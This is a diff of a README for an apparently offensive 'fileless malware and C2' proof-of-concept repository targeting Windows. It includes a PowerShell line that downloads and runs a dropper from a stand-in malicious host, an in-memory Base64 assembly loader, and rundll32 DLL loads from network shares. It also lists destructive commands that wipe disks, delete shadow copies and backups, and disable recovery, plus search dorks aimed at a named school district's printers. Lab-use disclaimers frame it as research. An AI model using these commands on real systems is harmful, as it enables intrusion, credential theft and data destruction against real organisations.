@@ -1,11 +1,11 @@
 
 
-# Art of Turning a Windows Host Against Itself:
-**PoC 'fileless' malware for educational and research purposes only.**
+# Yamata-no-OrochiC2: Fileless C2 Malware Research (PoC)
 
-> **Warning:**  
-> This repository is intended exclusively for educational, authorized penetration testing, and research use in isolated lab environments. **Do not deploy or test on any production or unauthorized systems.**  
-> The authors assume no liability for misuse.
+> **Warning**  
+> This project is **strictly for educational, authorized research, and penetration testing in isolated lab environments**.  
+> **Never deploy or test on production or unauthorized systems.  
+> The authors assume NO liability for misuse.**
 
 ---
 
@@ -15,7 +15,7 @@
 
 ## Table of Contents
 
-- [About Nightmare](#about-nightmare)
+- [About](#about)
 - [Features](#features)
 - [Getting Started](#getting-started)
   - [Prerequisites](#prerequisites)
@@ -36,11 +36,11 @@
 
 ---
 
-## About Nightmare
+## About
 
-Nightmare is a proof-of-concept (PoC) research project that simulates advanced fileless ransomware techniques on Windows 10/11. It leverages built-in system binaries (LOLBins) and exploits such as **HiveNightmare** (CVE-2021-36934) to demonstrate real-world attack chains for red and purple team exercises.
+**Yamata-no-OrochiC2** is a proof-of-concept (PoC) research project simulating advanced fileless malware and C2 (Command & Control) techniques for Windows 10/11. It leverages "Living Off the Land" tactics, built-in system binaries (LOLBins), and public exploits to demonstrate stealthy attacks without touching disk.
 
-**Primary objectives:**
+**Primary Objectives:**
 - Enable cybersecurity professionals and students to study fileless malware behavior.
 - Support detection engineering, blue team training, and security research.
 - Demonstrate the abuse of trusted Windows components for stealthy attacks.
@@ -49,12 +49,12 @@ Nightmare is a proof-of-concept (PoC) research project that simulates advanced f
 
 ## Features
 
-- **Fileless Attack Simulation**: Execute payloads without touching disk using only Windows-native tools.
-- **Privilege Escalation**: Demonstrates local privilege escalation via Print Spooler and HiveNightmare vulnerabilities.
-- **Credential Theft**: Shows techniques for extracting credentials using in-memory or LOLBin methods.
-- **Reflective DLL Injection**: In-memory code execution without leaving artifacts.
-- **Detection & Mitigation Guidance**: MITRE ATT&CK mapping and blue team recommendations.
-- **Modular Payloads**: Includes C, C++, Python, and PowerShell examples for flexibility.
+- **Fileless Attack Simulation:** Execute payloads entirely in-memory with native Windows tools.
+- **Privilege Escalation:** Showcases escalation via Print Spooler and HiveNightmare vulnerabilities.
+- **Credential Theft:** Demonstrates credential extraction using LOLBins and memory attacks.
+- **Reflective DLL Injection:** In-memory module execution with minimal artifacts.
+- **Detection & Mitigation Guidance:** MITRE ATT&CK mapping and blue team recommendations.
+- **Modular Payloads:** Examples in Batch, PowerShell, C, C++, Python, and HTML.
 
 ---
 
@@ -63,7 +63,7 @@ Nightmare is a proof-of-concept (PoC) research project that simulates advanced f
 ### Prerequisites
 
 - Windows 10/11 **lab environment** (never test on production systems)
-- Visual Studio (for building C/C++ projects)
+- Visual Studio (for C/C++ project builds)
 - PowerShell 5.0+
 - 7-Zip (for extracting embedded payloads)
 
@@ -71,38 +71,38 @@ Nightmare is a proof-of-concept (PoC) research project that simulates advanced f
 
 1. **Clone the repository:**
     ```bash
-    git clone https://github.com/P1rat3xai/Nightmare.git
-    cd Nightmare
+    git clone https://github.com/MrF0XTUT/Yamata-no-OrochiC2.git
+    cd Yamata-no-OrochiC2
     ```
 2. **Build DLL/executable payloads:**
-    - Open `core/Nightmare.sln` in Visual Studio and build, **or**
+    - Open `core/Yamata-no-OrochiC2.sln` in Visual Studio and build, **or**
     - Use provided build scripts (see `build_windows.bat`)
 
 ---
 
 ## Technical Overview
 
-Nightmare focuses on simulating fileless ransomware attack chains involving:
+This project focuses on simulating fileless ransomware and C2 attack chains, including:
 
-- **Initial Access**: Using LOLBins to download and execute payloads in memory.
-- **Privilege Escalation**: Leveraging Print Spooler and HiveNightmare vulnerabilities.
-- **Credential Access**: Dumping sensitive information (e.g., LSASS memory).
-- **Lateral Movement**: Moving across the network using native Windows protocols.
-- **Impact**: Encrypting/wiping files and disrupting system recovery mechanisms.
+- **Initial Access:** LOLBins download and execute payloads in memory.
+- **Privilege Escalation:** Print Spooler & HiveNightmare exploitation.
+- **Credential Access:** Dumping credentials from memory (e.g., LSASS).
+- **Lateral Movement:** Native Windows protocols for network spread.
+- **Impact:** Encrypting/wiping files, disabling recovery.
 
-> **Note:** All techniques are demonstrated for blue team and detection research purposes.
+> **Note:** All techniques are for blue team and detection research purposes only.
 
 ---
 
 ## Attack Chain Example (PowerShell)
 
-A staged PowerShell simulation using only built-in Windows tools (LOLBins):
+A staged simulation using only built-in Windows tools:
 
 ```powershell
 # Initial Access: Load dropper
 IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")
 
-# Execution: Decode and load in-memory payload
+# Decode and load in-memory payload
 $bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
 [System.Reflection.Assembly]::Load($bytes)
 
@@ -135,10 +135,9 @@ Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ra
 ## Reconnaissance and LOLBins
 
 ### Google Dork Examples
-SHODAN or [FOFA](https://en.fofa.info/). 
-**Objective:** Identify publicly exposed printer services that may be vulnerable to PrintNightmare or similar exploits.
 
-Example queries:
+Use search engines (SHODAN, FOFA) to find vulnerable printer services:
+
 ```
 inurl:"/hp/device/this.LCDispatcher" "Moberly"
 intitle:"Printer Status" "Moberly Public Schools"
@@ -152,12 +151,13 @@ intitle:"PaperCut MF" "Moberly"
 
 ### Living Off the Land Binaries (LOLBins)
 
-LOLBins are trusted Windows binaries commonly abused for stealthy attacks.  
-**Example (Print Service Attack):**
+Trusted Windows binaries often abused for stealthy attacks:
+
 ```cmd
 rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
 ```
-Attackers use LOLBins like `rundll32.exe`, `regsvr32.exe`, and `powershell.exe` to execute payloads filelessly from network shares.
+
+Attackers use `rundll32.exe`, `regsvr32.exe`, `powershell.exe` to execute payloads filelessly from network shares.
 
 ---
 
@@ -165,7 +165,7 @@ Attackers use LOLBins like `rundll32.exe`, `regsvr32.exe`, and `powershell.exe` 
 
 ### Fileless Dropper Embedding
 
-**Goal:** Embed and extract payloads from benign-looking files using only built-in tools.
+**Goal:** Hide payloads inside benign files, extract and execute with native tools.
 
 1. **Embed Payload:**
     ```bash
@@ -177,8 +177,6 @@ Attackers use LOLBins like `rundll32.exe`, `regsvr32.exe`, and `powershell.exe` 
     7z x dropper.7z -oC:\Users\Public\
     ```
 
-This technique bypasses traditional file extension filtering and leverages trusted tools for payload delivery.
-
 ### Reflective DLL Injection
 
 Loads a malicious DLL directly in memory, evading disk forensics.
@@ -186,33 +184,32 @@ Loads a malicious DLL directly in memory, evading disk forensics.
 ```cmd
 rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
 ```
-No file is written to disk; execution is performed in-memory.
 
 ---
 
 ## MITRE ATT&CK Mapping
 
-| Phase                | Technique                               | ID                   | Description                                    |
-|----------------------|-----------------------------------------|----------------------|------------------------------------------------|
-| Initial Access       | Valid Accounts / Drive-by Compromise    | T1078, T1189         | Compromising print interfaces                  |
-| Execution            | DLL Side-Loading / LOLBins              | T1218, T1055.001     | Running DLLs reflectively                      |
-| Privilege Escalation | Print Spooler Exploits / Hive ACL Abuse | T1068, T1003.002     | SYSTEM access, SAM hash extraction             |
-| Defense Evasion      | Fileless Execution / Obfuscated Files   | T1027, T1202         | Encoded payloads via certutil, mshta, etc.     |
-| Credential Access    | LSASS Dumping / SAM Hive Access         | T1003                | Credential dumping                             |
-| Lateral Movement     | SMB/Net Share Enumeration               | T1021.002            | Spread via printer shares                      |
-| Impact               | Data Destruction / Encryption           | T1485, T1486         | Fileless wiperware via DLL payloads            |
+| Phase                | Technique                             | ID               | Description                               |
+|----------------------|---------------------------------------|------------------|-------------------------------------------|
+| Initial Access       | Valid Accounts / Drive-by Compromise  | T1078, T1189     | Compromising print interfaces             |
+| Execution            | DLL Side-Loading / LOLBins            | T1218, T1055.001 | Running DLLs reflectively                 |
+| Privilege Escalation | Print Spooler Exploits / Hive ACL     | T1068, T1003.002 | SYSTEM access, SAM hash extraction        |
+| Defense Evasion      | Fileless Execution / Obfuscated Files | T1027, T1202     | Encoded payloads via certutil, mshta, etc |
+| Credential Access    | LSASS Dumping / SAM Hive Access       | T1003            | Credential dumping                        |
+| Lateral Movement     | SMB/Net Share Enumeration             | T1021.002        | Spread via printer shares                 |
+| Impact               | Data Destruction / Encryption         | T1485, T1486     | Fileless wiperware via DLL payloads       |
 
 ---
 
 ## Destructive LOLBin Payloads
 
-Demonstrate ransomware/wiper activity using only Windows-native binaries:
+Demonstrate ransomware/wiper activity using only native binaries:
 
 - **cipher.exe** — Wipe free space:  
   `cipher /w:C:\`
 - **vssadmin.exe** — Delete shadow copies:  
   `vssadmin delete shadows /all /quiet`
-- **wbadmin.exe** — Nuke backups:  
+- **wbadmin.exe** — Remove backups:  
   `wbadmin delete systemstatebackup -keepVersions:0`
 - **bcdedit.exe** — Disable recovery:  
   `bcdedit /set {default} recoveryenabled No`
@@ -259,10 +256,10 @@ Demonstrate ransomware/wiper activity using only Windows-native binaries:
 
 ## Legal Disclaimer
 
-> **All content, code, and techniques in this repository are provided solely for educational and authorized security research.  
+> All content, code, and techniques in this repository are provided solely for educational and authorized security research.  
 > Any unauthorized use, distribution, or deployment is strictly prohibited.  
 > Use responsibly and always comply with applicable laws and regulations.  
-> The authors bear no liability for misuse.**
+> **The authors bear NO liability for misuse.**
 
 ---
 
@@ -282,3 +279,4 @@ Demonstrate ransomware/wiper activity using only Windows-native binaries:
 ---
 
 **Stay safe, research responsibly, and always act within ethical and legal boundaries.**
+
